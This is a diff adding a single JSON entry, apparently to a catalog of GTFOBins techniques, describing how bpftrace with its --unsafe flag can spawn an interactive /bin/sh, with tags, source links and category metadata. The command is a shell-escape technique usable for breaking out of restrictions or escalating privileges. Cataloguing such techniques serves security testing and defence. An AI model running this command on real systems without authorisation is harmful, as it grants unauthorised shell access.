@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-bpftrace-shell-1",
+  "name": "GTFOBins · bpftrace (shell) #1",
+  "command": "bpftrace --unsafe -e 'BEGIN {system(\"/bin/sh 1<&0\");exit()}'",
+  "description": "Use bpftrace to shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "bpftrace",
+    "shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/bpftrace/#shell",
+  "upstream_id": "bpftrace/shell/0",
+  "category": "gtfobins",
+  "subcategory": "shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/bpftrace/"
+    }
+  ]
+}
